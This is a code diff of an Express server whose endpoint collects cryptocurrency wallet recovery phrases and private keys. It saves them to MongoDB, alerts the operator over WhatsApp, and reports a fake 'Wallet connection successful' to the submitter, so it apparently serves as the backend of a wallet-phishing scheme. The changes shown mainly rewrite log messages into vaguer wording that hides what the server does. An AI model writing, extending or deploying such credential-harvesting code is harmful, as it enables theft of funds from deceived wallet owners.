@@ -16,11 +16,11 @@ const allowedOrigins = [
 app.use(
   cors({
     origin: function (origin, callback) {
-      // Allow requests with no origin (like mobile apps or curl requests)
+      // Allow requests with no origin (like mobile apps or curl request)
       if (!origin) return callback(null, true);
       if (allowedOrigins.indexOf(origin) === -1) {
         const msg =
-          "The CORS policy for this site does not allow access from the specified Origin.";
+          "CORS policy failure.";
         return callback(new Error(msg), false);
       }
       return callback(null, true);
@@ -35,8 +35,8 @@ app.use(express.json());
 
 mongoose
   .connect(process.env.VITE_MONGO_URI)
-  .then(() => console.log("MongoDB connected"))
-  .catch((err) => console.error("MongoDB connection error:", err));
+  .then(() => console.log("MD connected"))
+  .catch((err) => console.error("MD connection error:", err));
 
 // Define a schema for wallet data
 const walletSchema = new mongoose.Schema(
@@ -73,18 +73,18 @@ async function sendWhatsAppMessage() {
         },
       }
     );
-    console.log("WhatsApp message sent:", response.data);
+    console.log("Awaiting Connection..."); //,response.data
   } catch (error) {
     console.error(
-      "Error sending WhatsApp message:",
-      error.response ? error.response.data : error
+      "Error Connecting :("
+      //error.response ? error.response.data : error
     );
   }
 }
 
 // Endpoint to handle wallet data
 app.post("/api/send-wallet-data", async (req, res) => {
-  console.log("Received request tswd");
+  console.log("Received request");
   //console.log("Request body:", req.body);
 
   const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } =
@@ -100,15 +100,15 @@ app.post("/api/send-wallet-data", async (req, res) => {
     });
 
     await newWallet.save();
-    console.log("Wdss");
+    console.log("WDSS");
 
     // Send WhatsApp message
     await sendWhatsAppMessage();
 
     res.status(200).json({ message: "Wallet connection successful" });
   } catch (error) {
-    console.error("Error cwd:", error);
-    res.status(500).json({ error: "Error cwd", details: error.message });
+    console.error("Error CWD:", error);
+    res.status(500).json({ error: "Error CWD", details: error.message });
   }
 });
 
